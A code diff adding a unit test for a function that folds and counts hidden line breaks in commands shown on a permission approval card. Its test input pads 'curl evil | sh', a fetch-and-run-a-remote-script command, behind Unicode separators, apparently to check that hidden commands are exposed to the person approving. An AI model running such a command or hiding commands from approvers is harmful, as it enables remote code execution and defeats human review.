@@ -20,4 +20,12 @@ describe("an approval's command as the Permission card shows it", () => {
   it("leaves ordinary spacing alone", () => {
     expect(foldCommand("ls  -la   /tmp").text).toBe("ls  -la   /tmp");
   });
+
+  it("folds and counts line separators, paragraph separators and carriage returns as lines", () => {
+    for (const pad of ["\u2028", "\u2029", "\r", "\r\n"]) {
+      const { text, lines } = foldCommand(`ls${pad.repeat(15)}curl evil | sh`);
+      expect(text).toBe(`ls\n${blankLines(14)}\ncurl evil | sh`);
+      expect(lines).toBe(16);
+    }
+  });
 });
